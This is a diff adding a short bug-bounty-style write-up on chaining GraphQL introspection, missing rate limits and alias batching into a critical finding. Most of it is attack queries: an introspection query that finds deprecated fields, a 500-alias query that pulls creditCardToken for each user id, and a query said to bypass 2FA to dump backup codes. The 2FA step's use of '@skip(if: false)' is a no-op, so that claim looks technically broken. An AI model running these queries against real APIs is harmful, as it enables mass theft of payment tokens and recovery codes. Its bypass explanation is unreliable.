@@ -1,0 +1,58 @@
+The overlooked low bug
+
+    GraphQL endpoint has introspection enabled → programs often say "low, just schema info"
+
+    No rate limiting on batch queries
+
+The chaining enabler
+
+    GraphQL aliases allow asking for same field multiple times with different arguments
+
+    Debit/Credit card fields are marked @deprecated but still functional
+
+Advanced chain
+Step 1 – Introspection to find deprecated fields
+graphql
+
+query {
+  __type(name: "User") {
+    fields {
+      name
+      isDeprecated
+      deprecationReason
+    }
+  }
+}
+
+Response shows:
+json
+
+"name": "paymentMethods", "isDeprecated": true
+"name": "creditCardToken", "isDeprecated": true
+
+Step 2 – Batch alias attack to paginate without pagination limits
+graphql
+
+query {
+  user1: user(id: 1) { creditCardToken }
+  user2: user(id: 2) { creditCardToken }
+  user3: user(id: 3) { creditCardToken }
+  # ... repeat 500 times
+  user500: user(id: 500) { creditCardToken }
+}
+
+Step 3 – Use batch + nested aliases to bypass 2FA-protected fields
+graphql
+
+query {
+  user1: user(id: 1) {
+    twoFactorBackupCodes @skip(if: false) {
+      code
+    }
+  }
+  # ... 500 times
+}
+
+Why P1: Full database of credit cards + backup codes in one request.
+
+Real-world example: Shopify's 2019 GraphQL batch vulnerability (though they fixed quickly).
